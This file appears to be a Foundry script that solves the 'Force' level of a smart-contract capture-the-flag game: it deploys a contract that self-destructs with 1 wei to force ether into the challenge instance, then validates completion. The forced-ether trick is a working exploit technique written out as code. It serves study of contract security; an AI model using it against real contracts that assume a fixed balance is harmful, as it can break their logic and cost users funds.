// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/7-Force.sol";
import {ForceFactory} from "../src/ForceFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract ForceSolution is Script {
    Force public forceLevel;
    address payable instanceAddress =
        payable(0x9b3Fa4F980c886190690843B43666AceD93ff26D);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        forceLevel = Force(instanceAddress);

        console.log(
            "Balance of Contract before Attack: %s",
            instanceAddress.balance
        );

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: 1 wei}(instanceAddress);
        vm.stopBroadcast();

        console.log(
            "Balance of Contract after attack: %s",
            instanceAddress.balance
        );

        validate();
    }

    function validate() internal {
        bool isValidated = new ForceFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attack is Force {
    constructor(address payable forceLevelAddress) payable {
        selfdestruct(forceLevelAddress);
    }
}
